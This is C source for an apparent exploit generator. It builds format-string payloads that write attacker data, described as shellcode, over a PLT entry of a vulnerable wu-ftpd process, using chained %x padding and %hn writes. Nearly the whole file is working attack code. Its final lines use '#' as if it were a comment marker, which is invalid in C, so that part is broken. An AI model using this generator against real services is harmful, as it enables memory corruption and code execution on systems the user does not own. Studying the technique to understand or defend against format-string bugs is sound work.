/**
Given a shellcode to variable string_to_upload and the address of PLT function to variable "addr" the script will generate a Format string  string to overwrite the PLT section with the shellcode 


**/
#include <stdio.h>
#include <stdlib.h>

int safe_strcat( char *dest, char *src, unsigned dest_len )
{
     if( ( dest == NULL ) || ( src == NULL ) )
             return 0;

        if ( strlen( src ) + strlen( dest ) + 10 >= dest_len )
             return 0;

     strcat( dest, src );

     return 1;
}

int err( char *msg )
{
     printf("%s\n", msg);
     return 1;
}

int main( int argc, char *argv[] )
{
     // modify the strings below to upload different data to the wu-ftpd process...
     char *string_to_upload = "mary had a little lamb";
     unsigned int addr = 0x0806d3b0;

     // this is the offset of the parameter that 'contains' the start of our string.
     unsigned int param_num = 272;
     char buff[ 4096 ] = "";
     int buff_size = 4096;
     char tmp[ 4096 ] = "";
     int i, j, num_so_far = 6, num_to_print, num_so_far_mod;
     unsigned short s;
     char *psz;
     int num_addresses, a[4];
     
     // first work out How many addresses there are. num bytes / 2 + num bytes mod 2.

     num_addresses = (strlen( string_to_upload ) / 2) + strlen( string_to_upload) % 2;
     
     for( i = 0; i < num_addresses; i++ )
     {
            a[0] = addr & 0xff;
            a[1] = (addr & 0xff00) >> 8;
            a[2] = (addr & 0xff0000) >> 16;
            a[3] = (addr) >> 24;
            
            sprintf( tmp, "\\x%.02x\\x%.02x\\x%.02x\\x%.02x", a[0], a[1], a[2], a[3] );

            if( !safe_strcat( buff, tmp, buff_size )) 
                    return err("Oops. Buffer too small.");

            addr += 2;

            num_so_far += 4;
     }

     printf( "%s\n", buff );
     
     // now upload the string 2 bytes at a time. Make sure that num_so_far is appropriate by doing %2000x or whatever.
     psz = string_to_upload;

     while( (*psz != 0) && (*(psz+1) != 0) )
     {
            // how many chars to print to make (so_far % 64k)==s
            // 
            s = *(unsigned short *)psz;

            num_so_far_mod = num_so_far &0xffff;

            num_to_print = 0;
            
            if( num_so_far_mod < s )
                    num_to_print = s - num_so_far_mod;
            else
                    if( num_so_far_mod > s )
                          num_to_print = 0x10000 - (num_so_far_mod - s);
     
            // if num_so_far_mod and s are equal, we'll 'output' s any-way :o)
            num_so_far += num_to_print;

            // print the difference in characters
            if( num_to_print > 0 )
            {
                    sprintf( tmp, "%%%dx", num_to_print );
                    if(!safe_strcat( buff, tmp, buff_size ))
                           return err("Buffer too small.");
            }

            // now upload the 'short' value
            sprintf( tmp, "%%%d$hn", param_num );
            if( !safe_strcat( buff, tmp, buff_size ))
                    return err("Buffer too small.");
            
            psz += 2;
            param_num++;
     }
     
     printf( "%s\n", buff );

     #sprintf( tmp, "./vulnerable_rogram  $'%s' 1\n", buff );
     #system( tmp );
     
     return 0;
}






